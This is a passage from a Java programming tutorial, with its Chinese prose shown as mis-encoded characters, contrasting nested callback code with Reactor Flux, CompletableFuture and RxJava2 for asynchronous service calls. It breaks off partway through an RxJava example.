<p>å‰é¢çš„æ–¹å¼å¤§è‡´äº†è§£äº† JDK9 ä¸­æ›´æ–°çš„ Reactive Streams çš„è§„èŒƒï¼Œå’±ä»¬å®ç°ä¹Ÿä»…ä»…æ˜¯çœ‹åˆ°äº†å‘å¸ƒè®¢é˜…å’Œå›å‹çš„æ•ˆæœã€‚å¹¶æ²¡æœ‰çœ‹åˆ°å¦‚ä½•è§£å†³å›è°ƒåœ°ç‹±çš„é—®é¢˜ã€‚å’±ä»¬å¯ä»¥é€šè¿‡ Spring5 å®˜ç½‘æä¾›çš„ä¸€ä¸ªä¾‹å­ï¼Œæ¥ä½“éªŒä¸€ä¸‹ CallBack Hell å›è°ƒåœ°ç‹±å¸¦æ¥çš„é—®é¢˜ã€‚åé¢å†æ ¹æ®ä¸‰æ–¹çš„å®ç°æ¥çœ‹ä¸€ä¸‹åŸºäº Reactive Streams å®ç°åæ•ˆæœå¦‚ä½•ã€‚è¿™é‡ŒåŸºæœ¬æ˜¯æ ¹æ®ä¼ªä»£ç èµ°çš„ã€‚</p>
<p>ä¾‹å­ï¼šåœ¨ç”¨æˆ·çš„ UI é¡µé¢ä¸Šï¼Œå±•ç¤ºå½“å‰ç”¨æˆ·æœ€å–œæ¬¢çš„ Top5 çš„å•†å“è¯¦æƒ…ã€‚è¿™é‡Œä¼šæ ¹æ®ç”¨æˆ·çš„ ID å»æŸ¥è¯¢å½“å‰ç”¨æˆ· Top5 å•†å“çš„IDï¼Œå¦‚æœ ID å¯ä»¥æŸ¥è¯¢åˆ°ä¹‹åå†æ ¹æ®å•†å“çš„ ID å»æŸ¥è¯¢å•†å“çš„è¯¦æƒ…ã€‚å¦‚æœå½“å‰ç”¨æˆ· ID æŸ¥è¯¢çš„ç»“æœä¸å­˜åœ¨å–œæ¬¢çš„ Top å•†å“ï¼Œæ²¡æœ‰çš„è¯ï¼Œé€šè¿‡æ¨èæœåŠ¡æŸ¥è¯¢ Top5 çš„å•†å“ä¿¡æ¯ã€‚å±•ç¤ºç»™ç”¨æˆ·ã€‚</p>
<p>å½“å‰ä¾‹å­éœ€è¦ä¸‰ä¸ªæœåŠ¡çš„æ”¯æ’‘ï¼š</p>
<ul>
<li>æ ¹æ®ç”¨æˆ· ID æŸ¥è¯¢ç”¨æˆ·çš„ Top5 å•†å“IDã€‚</li>
<li>æ ¹æ® Top5 å•†å“IDæŸ¥è¯¢å•†å“è¯¦æƒ…ã€‚</li>
<li>è°ƒç”¨æ¨èæœåŠ¡ï¼Œè·å–5ä¸ªå•†å“è¯¦æƒ…ã€‚</li>
</ul>
<p>åŸºäº Java æœ€åŸç”Ÿçš„å¼‚æ­¥ç¼–ç¨‹æ–¹å¼ï¼Œå®ç°ä¸Šè¿°æ“ä½œï¼Œæ¥çœ‹çœ‹åˆ°åº•ä»€ä¹ˆæ˜¯å›è°ƒåœ°ç‹±ã€‚ã€‚ã€‚</p>
<p>å•†å“è¯¦æƒ…å®ä½“ç±»ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fav</span> {

    <span class="hljs-keyword">private</span> String itemId;

    <span class="hljs-keyword">private</span> String itemName;

    <span class="hljs-keyword">private</span> String itemDetail;

}
</code></pre>
<p>å‡†å¤‡å›è°ƒæ–¹æ³•ï¼Œæ‹¿åˆ°ç»“æœåè§¦å‘</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Callback</span>&lt;T&gt; {

    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(T t)</span>;

    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span>;

}
</code></pre>
<p>å‡†å¤‡äº†è®¿é—®ä¸‰ä¸ªæœåŠ¡çš„ Service æ¥å£</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-comment">/**
     * æ ¹æ®ç”¨æˆ·IdæŸ¥è¯¢ç”¨æˆ·çš„Top5å•†å“Id
     * <span class="hljs-doctag">@param</span> userId
     * <span class="hljs-doctag">@param</span> list
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getFav</span><span class="hljs-params">(String userId, Callback&lt;List&lt;String&gt;&gt; list)</span>;

}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ItemService</span> {
    
    <span class="hljs-comment">/**
     * æ ¹æ®å•†å“IdæŸ¥è¯¢å•†å“çš„è¯¦æƒ…
     *
     * <span class="hljs-doctag">@param</span> itemId
     * <span class="hljs-doctag">@param</span> callback
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDetail</span><span class="hljs-params">(String itemId, Callback&lt;Fav&gt; callback)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SuggestionService</span> {

    <span class="hljs-comment">/**
     * è°ƒç”¨æ¨èæœåŠ¡ï¼Œè·å–æ¨èå•†å“
     * <span class="hljs-doctag">@param</span> favs
     */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getSuggestion</span><span class="hljs-params">(Callback&lt;List&lt;Fav&gt;&gt; favs)</span>;
}
</code></pre>
<p>å‡†å¤‡äº†å“åº”æ•°æ®çš„ UI çº¿ç¨‹å·¥å…·ä»¥åŠå“åº”æ–¹æ³•</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UiUtils</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitOnUiThread</span><span class="hljs-params">(Runnable runnable)</span>{
        <span class="hljs-comment">// çº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹åšå“åº”çš„æ“ä½œâ€¦â€¦â€¦â€¦â€¦â€¦</span>
    }


    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(Object obj)</span>{
        <span class="hljs-comment">// åˆ©ç”¨UIçº¿ç¨‹å±•ç¤ºå…·ä½“æ•°æ®</span>
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">error</span><span class="hljs-params">(Object obj)</span>{
        <span class="hljs-comment">// å‡ºç°é”™è¯¯å“åº”çš„å†…å®¹</span>
    }

}
</code></pre>
<p>å®Œæˆäº† Controller ä¸­çš„å¼‚æ­¥ç¼–ç¨‹æ•ˆæœ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CallBackHellController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ItemService itemService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SuggestionService suggestionService;


    <span class="hljs-meta">@GetMapping("/callbackhell")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">callbackHell</span><span class="hljs-params">(String userId)</span>{
        <span class="hljs-comment">//1ã€è°ƒç”¨ç”¨æˆ·æœåŠ¡ï¼ŒæŸ¥è¯¢Top5å•†å“Id</span>
        userService.getFav(userId, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Callback</span>&lt;List&lt;String&gt;&gt;() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(List&lt;String&gt; list)</span> {
                <span class="hljs-comment">// å·²ç»æŸ¥è¯¢åˆ°å•†å“Idï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯å¦æœ‰å€¼</span>
                <span class="hljs-keyword">if</span> (list.isEmpty()){
                    <span class="hljs-comment">// 3ã€ç”¨æˆ·æ²¡æœ‰Top5å•†å“Idï¼Œé€šè¿‡æ¨èæœåŠ¡æŸ¥è¯¢æ¨èå•†å“è¯¦æƒ…</span>
                    suggestionService.getSuggestion(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Callback</span>&lt;List&lt;Fav&gt;&gt;(){
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(List&lt;Fav&gt; favs)</span> {
                            <span class="hljs-comment">// æ¨èæœåŠ¡æŸ¥è¯¢åˆ°äº†å•†å“è¯¦æƒ…ï¼Œå“åº”å³å¯</span>
                            UiUtils.submitOnUiThread(() -&gt; {
                                favs.stream().limit(<span class="hljs-number">5</span>).forEach(UiUtils::show);
                            });
                        }
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> {
                            UiUtils.error(throwable);
                        }
                    });

                }
                <span class="hljs-keyword">else</span>{
                    <span class="hljs-comment">// 2ã€é€šè¿‡ç”¨æˆ·æŸ¥è¯¢åˆ°äº†Top5å•†å“Idï¼Œé€šè¿‡å•†å“IdæŸ¥è¯¢å•†å“è¯¦æƒ…</span>
                    list.stream().limit(<span class="hljs-number">5</span>).forEach(itemId -&gt; itemService.getDetail(itemId,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Callback</span>&lt;Fav&gt;(){

                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(Fav fav)</span> {
                            <span class="hljs-comment">// æŸ¥è¯¢åˆ°äº†å•†å“è¯¦æƒ…ï¼Œåˆ©ç”¨UIçº¿ç¨‹ï¼Œç»™å®¢æˆ·ç«¯å“åº”æ•°æ®</span>
                            UiUtils.submitOnUiThread(() -&gt; UiUtils.show(fav));
                        }

                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> {
                            <span class="hljs-comment">// å‡ºç°å¼‚å¸¸äº†ã€‚</span>
                            UiUtils.error(throwable);
                        }
                    }));
                }
            }
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Throwable throwable)</span> {
                <span class="hljs-comment">// å‡ºç°å¼‚å¸¸äº†ã€‚</span>
                UiUtils.error(throwable);
            }
        });


    }

}
</code></pre>
<h3 data-id="heading-6">è§£å†³å›è°ƒåœ°ç‹±é—®é¢˜</h3>
<p>è¿™é‡Œä¸ºäº†è§£å†³å›è°ƒåœ°ç‹±é—®é¢˜ï¼Œéœ€è¦ä¸€ä¸ª Reactor çš„ä¾èµ–æ¥å¸®åŠ©å’±ä»¬å®ç°å¼‚æ­¥ç¼–ç¨‹ã€‚</p>
<p>éœ€è¦å¯¼å…¥ä¾èµ–</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--reactorçš„æ ¸å¿ƒä¾èµ–--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.projectreactor<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>reactor-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.7.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>ä¸èƒ½å†ä½¿ç”¨ä¹‹å‰çš„ Callback æ–¹å¼äº†ã€‚éœ€è¦ä½¿ç”¨ reactor æä¾›çš„ Fluxï¼Œå¹¶ä¸”è¿™ç§é“¾å¼æ“ä½œä¼šæ›´ç›´è§‚ï¼Œä¹Ÿæ›´å¥½ç»´æŠ¤ã€‚å°±åªéœ€è¦ä¿®æ”¹ä¸‰ä¸ªæœåŠ¡å¯¹åº”çš„ Serviceã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-comment">/**
     * æ ¹æ®ç”¨æˆ·IDæŸ¥è¯¢Top5å•†å“ID
     * <span class="hljs-doctag">@param</span> userId
     * <span class="hljs-doctag">@return</span>
     */</span>
    Flux&lt;List&lt;String&gt;&gt; <span class="hljs-title function_">getFav</span><span class="hljs-params">(String userId)</span>;

}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ItemService</span> {


    <span class="hljs-comment">/**
     * æ ¹æ®å•†å“IDæŸ¥è¯¢å•†å“è¯¦æƒ…
     * <span class="hljs-doctag">@param</span> itemId
     * <span class="hljs-doctag">@return</span>
     */</span>
    Flux&lt;Fav&gt; <span class="hljs-title function_">getDetail</span><span class="hljs-params">(String itemId)</span>;

}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SuggestionService</span> {

    <span class="hljs-comment">/**
     * è·å–æ¨èçš„å•†å“è¯¦æƒ…
     * <span class="hljs-doctag">@return</span>
     */</span>
    Flux&lt;List&lt;Fav&gt;&gt; <span class="hljs-title function_">getSuggestion</span><span class="hljs-params">()</span>;

}
</code></pre>
<p>ç„¶åå°±å¯ä»¥åˆ©ç”¨ Flux æä¾›çš„ API æ¥è§£å†³ä¹‹å‰å›è°ƒåœ°ç‹±çš„é—®é¢˜ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactorCallbackController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ItemService itemService;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> SuggestionService suggestionService;


    <span class="hljs-meta">@GetMapping("reactorcallback")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reactorCallback</span><span class="hljs-params">(String userId)</span>{
        userService
                .getFav(userId)   <span class="hljs-comment">// æ ¹æ®ç”¨æˆ·IdæŸ¥è¯¢Top5å•†å“Id</span>
                .flatMap(itemService::getDetail)  <span class="hljs-comment">// æ ¹æ®å•†å“IDæŸ¥è¯¢å•†å“è¯¦æƒ…</span>
                .switchIfEmpty(suggestionService.getSuggestion())  <span class="hljs-comment">// å¦‚æœå‰é¢ä¸ºnullï¼Œè¿™é‡Œé€šè¿‡æ¨èæœåŠ¡æŸ¥è¯¢å•†å“è¯¦æƒ…</span>
                .take(<span class="hljs-number">5</span>)    <span class="hljs-comment">// è·å–å‰5ä¸ªæ•°æ®</span>
                .publishOn(UiUtils.reactorOnUiThread())    <span class="hljs-comment">// ä½¿ç”¨Uiçº¿ç¨‹</span>
                .subscribe(UiUtils::show,UiUtils::error);   <span class="hljs-comment">// æˆåŠŸèµ°showï¼Œå¤±è´¥èµ°error</span>
    }

}
</code></pre>
<h3 data-id="heading-7">CompletableFuture çš„å¼‚æ­¥ç¼–ç¨‹</h3>
<p>Future çš„å½¢å¼ç›¸æ¯” Callback Hell æ•ˆæœè¦å¥½ä¸€äº›ï¼Œè™½ç„¶ JDK8 å’Œ 9 éƒ½å¯¹ CompletableFuture åšäº†å„ç§ä¼˜åŒ–ï¼Œä½†æ˜¯ä»–çš„è¡¨ç°è¿˜æ˜¯ä¸å¤ªå¥½ã€‚å¤šä¸ªFutureåœ¨åµŒå¥—æ—¶ï¼Œå¯è¯»æ€§è¿˜æ˜¯æ¯”è¾ƒå·®çš„ã€‚å¹¶ä¸” CompletableFuture ä¸å­˜åœ¨ä»€ä¹ˆå›å‹ï¼Œæˆ–è€…æ˜¯å»¶è¿Ÿè°ƒç”¨çš„åŠŸèƒ½ã€‚</p>
<p>ç°åœ¨å€ŸåŠ© CompletableFuture æ¥å®ç°ä¸€ä¸ªåœºæ™¯ã€‚</p>
<ol>
<li>è·å–ä¸€ä¸ªç”¨æˆ·IDçš„åˆ—è¡¨ã€‚</li>
<li>é€šè¿‡ç”¨æˆ·IDåˆ†åˆ«è·å–ä»–çš„åå­—ä»¥åŠç»Ÿè®¡ä¿¡æ¯ã€‚ï¼ˆå¸Œæœ›è¿™ä¸¤ä¸ªæ“ä½œæ˜¯å¹¶è¡Œæ‰§è¡Œçš„ï¼‰</li>
<li>å½“ä¸¤ä¸ªä¿¡æ¯éƒ½è·å–åˆ°ä¹‹åï¼Œå°è£…æˆä¸€ä¸ªæ™®é€šå­—ç¬¦ä¸²å³å¯ã€‚</li>
<li>å“åº”æ•°æ®ï¼Œæœ€åæ‹¿åˆ°ç»“æœï¼ˆè¾“å‡ºä¸€ä¸‹ï¼‰ã€‚</li>
</ol>
<p>å®ç°ä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetNameAndStatTestByCF</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1ã€è·å–ä¸€ç»„ç”¨æˆ·IDåˆ—è¡¨</span>
        CompletableFuture&lt;List&lt;String&gt;&gt; idList = getID();
        CompletableFuture&lt;List&lt;String&gt;&gt; dataCompletableFuture = idList.thenComposeAsync(ids -&gt; {
            Stream&lt;CompletableFuture&lt;String&gt;&gt; resultStream = ids.stream().map(id -&gt; {
                <span class="hljs-comment">// 2ã€å¹¶è¡ŒåŸºäºIDæŸ¥è¯¢åç§°ä¿¡æ¯</span>
                CompletableFuture&lt;String&gt; nameTask = getName();
                <span class="hljs-comment">// 2ã€å¹¶è¡ŒåŸºäºIDæŸ¥è¯¢ç»Ÿè®¡ä¿¡æ¯</span>
                CompletableFuture&lt;Integer&gt; statTask = getStat();
                <span class="hljs-comment">// è®©ä¸¤ä¸ªæŸ¥è¯¢åç§°ä¿¡æ¯å’ŒæŸ¥è¯¢ç»Ÿè®¡ä¿¡æ¯æ“ä½œå¹¶è¡Œæ‰§è¡Œ</span>
                <span class="hljs-keyword">return</span> nameTask.thenCombineAsync(statTask, (name, stat) -&gt; {
                    <span class="hljs-comment">// 3ã€æ‹¿åˆ°ä¿¡æ¯ç»„è£…</span>
                    <span class="hljs-keyword">return</span> <span class="hljs-string">"Nameï¼š"</span> + name + <span class="hljs-string">"ï¼ŒStatï¼š"</span> + stat;
                });
            });
            <span class="hljs-comment">// å°†resultStreamè½¬æ¢æˆä¸€ä¸ªæ•°ç»„</span>
            List&lt;CompletableFuture&lt;String&gt;&gt; resultList = resultStream.toList();
            <span class="hljs-comment">// å…¨éƒ¨çš„ä»»åŠ¡å°è£…èµ·æ¥</span>
            CompletableFuture&lt;Void&gt; allDone = CompletableFuture.allOf(resultList.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>[]{}));
            <span class="hljs-comment">// æ‰§è¡Œå…¨éƒ¨ä»»åŠ¡</span>
            <span class="hljs-keyword">return</span> allDone.thenApplyAsync(v -&gt; resultList.stream()
                    .map(CompletableFuture::join)
                    .collect(Collectors.toList()));
        });

        <span class="hljs-comment">// 4ã€è·å–å…¨éƒ¨çš„ç»„ä»¶ä¿¡æ¯åå“åº”å®¢æˆ·ç«¯ï¼ˆè¾“å‡ºï¼‰</span>
        List&lt;String&gt; data = dataCompletableFuture.join();
        System.out.println(data);
    }

    <span class="hljs-comment">// æ¨¡æ‹ŸzzæœåŠ¡è·å–ç»Ÿè®¡ä¿¡æ¯</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CompletableFuture&lt;Integer&gt; <span class="hljs-title function_">getStat</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; <span class="hljs-number">666</span>);
    }

    <span class="hljs-comment">// æ¨¡æ‹ŸyyæœåŠ¡è·å–åç§°ä¿¡æ¯</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; <span class="hljs-string">"å¼ ä¸‰"</span>);
    }

    <span class="hljs-comment">// æ¨¡æ‹ŸxxæœåŠ¡ï¼Œè·å–ä¸€ç»„ç”¨æˆ·ID</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> CompletableFuture&lt;List&lt;String&gt;&gt; <span class="hljs-title function_">getID</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// æ¨¡æ‹ŸæŸ¥è¯¢ä¸‰æ–¹æœåŠ¡</span>
            List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
            list.add(<span class="hljs-string">"1"</span>);
            list.add(<span class="hljs-string">"2"</span>);
            list.add(<span class="hljs-string">"3"</span>);
            <span class="hljs-keyword">return</span> list;
        });
    }

}
</code></pre>
<h3 data-id="heading-8">è§£å†³ CompletableFuture çš„é—®é¢˜</h3>
<p>CompletableFuture å¯ä»¥å®ç°ä¸€äº›ç®€å•çš„å¼‚æ­¥ç¼–ç¨‹ï¼Œä½†æ˜¯å¯çœ‹æ€§å’Œç»´æŠ¤æ€§ä»¥ååæœŸçš„æ‰©å±•éƒ½éœ€è¦å¯¹æ•´ä½“ä»£ç åšæ¯”è¾ƒå¤§æˆæœ¬çš„ç»´æŠ¤ã€‚ä¾ç„¶é‡‡ç”¨ Reactor æ¥å®ç°ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„é€»è¾‘ï¼Œå†çœ‹ä»£ç æ•ˆæœã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetNameAndStatByReactor</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1ã€è·å–ä¸€ç»„ç”¨æˆ·IDåˆ—è¡¨</span>
        Flux&lt;String&gt; idFlux = getId();

        Flux&lt;String&gt; result = idFlux.flatMap(id -&gt; {
            <span class="hljs-comment">// 2ã€å¹¶è¡ŒåŸºäºIDæŸ¥è¯¢åç§°ä¿¡æ¯</span>
            Flux&lt;String&gt; nameFlux = getName(id);
            <span class="hljs-comment">// 2ã€å¹¶è¡ŒåŸºäºIDæŸ¥è¯¢ç»Ÿè®¡ä¿¡æ¯</span>
            Flux&lt;Integer&gt; statFlux = getStat(id);
            <span class="hljs-comment">// ä¿©ä»»åŠ¡å¹¶è¡Œå¤„ç†å®Œæ¯•ï¼Œè§¦å‘3</span>
            <span class="hljs-keyword">return</span> nameFlux.zipWith(statFlux, (name, stat) -&gt; {
                <span class="hljs-comment">// 3ã€æ‹¿åˆ°ä¿¡æ¯ç»„è£…</span>
                <span class="hljs-keyword">return</span> <span class="hljs-string">"Nameï¼š"</span> + name + <span class="hljs-string">"ï¼ŒStatï¼š"</span> + stat;
            });
        });
        Mono&lt;List&lt;String&gt;&gt; listMono = result.collectList();
        List&lt;String&gt; info = listMono.block();
        <span class="hljs-comment">// 4ã€è·å–å…¨éƒ¨çš„ç»„ä»¶ä¿¡æ¯åå“åº”å®¢æˆ·ç«¯ï¼ˆè¾“å‡ºï¼‰</span>
        System.out.println(info);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Flux&lt;Integer&gt; <span class="hljs-title function_">getStat</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-comment">// ä¼šæŸ¥è¯¢ä¸‰æ–¹æœåŠ¡ï¼Œç„¶åå°è£…ç»“æœ</span>
        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-number">888</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Flux&lt;String&gt; <span class="hljs-title function_">getName</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-comment">// ä¼šæŸ¥è¯¢ä¸‰æ–¹æœåŠ¡ï¼Œç„¶åå°è£…ç»“æœ</span>
        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">"å¼ ä¸‰"</span>);
    }


    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Flux&lt;String&gt; <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä¼šæŸ¥è¯¢ä¸‰æ–¹æœåŠ¡ï¼Œç„¶åå°è£…ç»“æœ</span>
        <span class="hljs-keyword">return</span> Flux.just(<span class="hljs-string">"1"</span>,<span class="hljs-string">"2"</span>,<span class="hljs-string">"3"</span>);
    }
}
</code></pre>
<h2 data-id="heading-9">RxJava2 å®ç°å¼‚æ­¥ç¼–ç¨‹</h2>
<p>RxJava æ˜¯ä¸€ä¸ªå°æ¡†æ¶ï¼Œæˆ–è€…æ˜¯ä¾èµ–åº“ã€‚åœ¨ RxJava çš„1.xç‰ˆæœ¬ä¸­ï¼Œå®ƒå¹¶ä¸åŸºäº Reactive Streams å»å®ç°çš„ã€‚æ²¡æœ‰å…³ç³»ï¼Œå› ä¸º RxJava çš„ 2 ç‰ˆæœ¬ï¼Œå°±æ˜¯åŸºäºReactive Streams å®ç°çš„äº†ã€‚</p>
<p>ä½¿ç”¨ RxJava å·¨ç®€å•ï¼Œå› ä¸ºä½œè€…æƒ³å°† RxJava å°½é‡åšåˆ°è½»é‡çº§ï¼Œå°±ä¸€ä¸ªä¾èµ–ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!--RxJava2çš„ä¾èµ–--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.reactivex.rxjava2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>rxjava<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2.21<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">RxJava2 çš„å…¥é—¨æ“ä½œ</h3>
<p>è·å–ä¸€ä¸ª Person å¯¹è±¡çš„é›†åˆï¼Œå°† Person é›†åˆä¸­çš„æ‰€æœ‰å¹´é¾„å¤§äº10å²çš„ Person å¯¹è±¡ç­›é€‰å‡ºæ¥ï¼Œå¹¶è¾“å‡ºä»–çš„åå­—ã€‚</p>
<p>é‡‡ç”¨ RxJava æ¥å®ç°ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">//1ã€è·å–Personå¯¹è±¡é›†åˆ</span>
        List&lt;Person&gt; personList = getPersonList();

        <span class="hljs-comment">//2ã€å®Œæˆä¸Šé¢è¦æ±‚çš„æ“ä½œ</span>
        <span class="hljs-comment">//2.1ã€å°†personé›†åˆè½¬æ¢ä¸ºRxJavaçš„æµ</span>
        Flowable.fromArray(personList.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[]{}))
                <span class="hljs-comment">//2.2 è¿‡æ»¤å¹´é¾„å¤§äº10å²çš„</span>
                .filter(person -&gt; person.getAge() &gt; <span class="hljs-number">10</span>)
                <span class="hljs-comment">//2.3 è·å–ç­›é€‰åçš„Personåç§°</span>
                .map(person -&gt; person.getName())
                <span class="hljs-comment">//2.4 è¾“å‡ºName</span>
                .subscribe(System.out::println);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Person&gt; <span class="hljs-title function_">getPersonList</span><span class="hljs-params">()</span> {
        List&lt;Person&gt; personList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"å¤§å¨ƒ"</span>,<span class="hljs-number">5</span>));
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"äºŒå¨ƒ"</span>,<span class="hljs-number">7</span>));
        personList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"ä¸‰å¨ƒ"</span>,<span class="hljs-number">9</span>));
